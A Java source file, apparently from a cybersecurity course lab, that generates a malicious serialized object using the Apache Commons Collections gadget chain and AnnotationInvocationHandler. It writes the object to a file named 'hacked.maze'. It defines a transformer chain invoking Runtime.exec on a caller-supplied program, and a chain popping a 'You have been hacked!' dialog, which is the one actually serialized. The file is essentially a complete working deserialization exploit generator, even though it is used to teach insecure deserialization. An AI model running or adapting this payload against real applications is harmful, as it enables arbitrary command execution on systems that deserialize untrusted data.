package fr.tp.cyber701.hack;

import java.awt.*;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

// Use these imports for commons collection version 3
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.swing.*;

// Use these imports for commons collection version 4
//import org.apache.commons.collections4.Transformer;
//import org.apache.commons.collections4.functors.ChainedTransformer;
//import org.apache.commons.collections4.functors.ConstantTransformer;
//import org.apache.commons.collections4.functors.InvokerTransformer;
//import org.apache.commons.collections4.map.TransformedMap;

public class HackedSerializedDataGenerator {

	public HackedSerializedDataGenerator() {
	}

	public static void main(String[] args) {
		System.setProperty( "org.apache.commons.collections.enableUnsafeSerialization", Boolean.TRUE.toString() );
		
		// Create a transformation chain that will call an external program
		final Transformer[] hackingTransformers = new Transformer[] {
			new ConstantTransformer( Runtime.class ),
			new InvokerTransformer( "getMethod",
									new Class<?>[] { String.class, Class[].class },
									new Object[] {"getRuntime", new Class[0] } ),
			new InvokerTransformer( "invoke",
									new Class<?>[] { Object.class, Object[].class },
									new Object[] { null, new Object[0] } ),
			
			// Invoke the "exec" method on the Java runtime object to execute a program whose executable file
			// is specified as args[ 0 ].
			new InvokerTransformer( "exec",
									new Class<?>[] { String.class },
									new Object[] { args[ 0 ] } ),
			
		};

		final Transformer[] jOptionPaneTransformers = new Transformer[] {
				new ConstantTransformer(JOptionPane.class),
				new InvokerTransformer(
						"getMethod",
						new Class[] { String.class, Class[].class },
						new Object[] { "showMessageDialog", new Class[] { Component.class, Object.class } }),
				new InvokerTransformer(
						"invoke",
						new Class[] { Object.class, Object[].class },
						new Object[] { null, new Object[] { null, "You have been hacked!" } }),
		};

		final Transformer hackingTransfChain = new ChainedTransformer( jOptionPaneTransformers );
		
		final Map<Object, Object> innerMap = new HashMap<>();
		innerMap.put( "value", "value" );
		
		// Use this instruction for Commons Collections 3
		@SuppressWarnings("unchecked")
		final Map<Object, Object> transformedMap = TransformedMap.decorate( innerMap, null, hackingTransfChain );
		
		// Use this instruction for Commons Collections 4
		//final Map<Object, Object> transformedMap = TransformedMap.transformedMap( innerMap, null, hackingTransfChain );
		
		int retCode = 0;
		ObjectOutputStream outStr = null;
		
		try {
			
			// The constructor of the AnnotationInvocationHandler class is of package visibility, so we must use
			// reflectivity to instantiate it.
			final Class<?> serializableClass = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
			final Constructor<?> construct  = serializableClass.getDeclaredConstructor( Class.class, Map.class );
			construct.setAccessible( true );
			final Object annInvocationHandlerInstance = construct.newInstance( Target.class, transformedMap );

			outStr = new ObjectOutputStream( new FileOutputStream( "hacked.maze" ) );
			// Serialize the instance and save it in a file named "hacked.maze"
			outStr.writeObject( annInvocationHandlerInstance );
		} catch ( ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException | InstantiationException | IOException ex ) {
			ex.printStackTrace();
			retCode = - 1;
		} finally {
			if(outStr != null) {
				try {
					outStr.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
		
		System.exit( retCode );
	}
}
